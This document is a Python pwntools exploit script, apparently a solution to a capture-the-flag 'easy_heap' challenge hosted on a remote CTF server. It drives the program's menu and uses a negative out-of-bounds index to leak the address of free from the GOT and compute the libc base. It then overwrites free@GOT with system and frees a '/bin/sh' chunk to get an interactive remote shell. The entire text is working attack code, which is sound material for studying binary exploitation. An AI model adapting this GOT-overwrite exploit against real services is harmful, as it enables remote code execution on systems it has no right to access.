from pwn import *

def start(name, age):
    r.sendlineafter('name:', name)
    r.sendlineafter('age:', str(age))
    r.recvuntil('choice:')

def create(idx, name):
    r.sendline('1')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', name)
    r.recvuntil('choice: ')

def edit(idx, name):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', name)
    r.recvuntil('choice: ')

def delete(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil('choice: ', timeout=1)

def show(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')
    data = r.recvuntil('\n', drop=True)
    r.recvuntil('choice: ')
    return data

libc = ELF('./easyheap_libc.so.6')
elf = ELF('./easy_heap_sym')

# r = process('./easy_heap_sym', env={'LD_PRELOAD': './easyheap_libc.so.6'})
r = remote('armexploit.acebear.site', 3002)

print 'pid:', pidof(r)
buf = 0x804b0a0
name_offset = -2147483648 + 0x10

start(p32(elf.got['free']), 20)

create(1, 'TEST')
delete(1)

free_leak = u32(show(name_offset)[:4])
libc.address = free_leak - libc.symbols['free']

log.info('free_leak : ' + hex(free_leak))
log.info('libc_base : ' + hex(libc.address))

edit(name_offset, p32(libc.symbols['system']))

create(2, '/bin/sh')
delete(2)

r.interactive()